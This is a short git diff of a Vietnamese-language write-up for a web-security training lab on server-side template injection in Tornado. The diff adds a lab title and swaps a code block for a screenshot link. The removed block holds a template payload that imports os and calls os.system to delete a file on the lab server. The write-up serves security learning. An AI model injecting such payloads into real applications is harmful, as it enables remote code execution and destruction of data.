@@ -38,7 +38,7 @@ LAB SOLVED!
 
 ***
 
-## 2. 
+## 2. Lab: Basic server-side template injection (code context)
 
 * Content:
 ```
@@ -64,10 +64,7 @@ Thực hiện post 1 comment lên và quan sát tên hiển thị => Thấy giá
 
 `Tornado template` sử dụng cú pháp sau để chạy lệnh OS => Áp dụng xóa file LAB yêu cầu:
 
-```
-{% import os %}
-{{os.system('rm /home/carlos/morale.txt')}}
-```
+<img width="167" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/189bd6e5-d9b8-4d41-abca-87c7f8cb9236">
 
 LAB SOLVED!
 
